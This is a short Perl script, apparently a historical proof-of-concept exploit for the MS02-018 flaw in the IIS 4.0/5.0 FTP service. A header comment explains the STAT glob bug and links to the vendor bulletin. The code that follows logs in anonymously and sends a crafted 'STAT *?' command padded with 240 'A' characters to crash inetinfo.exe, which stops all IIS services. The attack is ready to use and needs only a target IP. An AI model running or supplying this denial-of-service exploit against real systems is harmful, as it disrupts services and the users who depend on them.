#!/usr/bin/perl -w
##################
##################
#
#
#   URL: http://www.digitaloffense.net/
# EMAIL: hdm@digitaloffense.net
# USAGE: ./msftp_dos.pl <target ip>
#
# Summary:
#
#        The Microsoft FTP service contains a vulnerability in the STAT
#        command with the pattern-matching (glob) code. This vulnerability
#        could be exploited to execute a Denial of Service attack. This
#        affects IIS 4.0 and 5.0 and requires the attacker to be able to 
#        access the service either through a valid user account or via the
#        anonymous login which is enabled by default. The DoS attack will
#        bring down all services running under IIS (the inetinfo.exe process).
#
#        IIS 4.0 must be manually restarted to restore normal operation. IIS 5.0
#        will automatically restart the crashed services, but any users connected
#        to the service at the time of exploitation must reconnect.
#
#        At this time, there seems to be a slim-to-none chance of being able to
#        execute arbitrary code through this vulnerability.
#
# Solution:
#
#	http://www.microsoft.com/technet/security/bulletin/MS02-018.asp
#

use Net::FTP;
    
$target = shift() || die "usage: $0 <target ip>";
my $user = "anonymous";
my $pass = "crash\@burn.com";
my $exp = ("A" x 240);

print ":: Trying to connect to target system at: $target...\n";
$ftp = Net::FTP->new($target, Debug => 0, Port => 21) || die "could not connect: $!";
$ftp->login($user, $pass) || die "could not login: $!";
$ftp->cwd("/");

print ":: Trying to crash the FTP service...\n";
$ftp->quot("STAT *?" . $exp);
$ftp->quit;

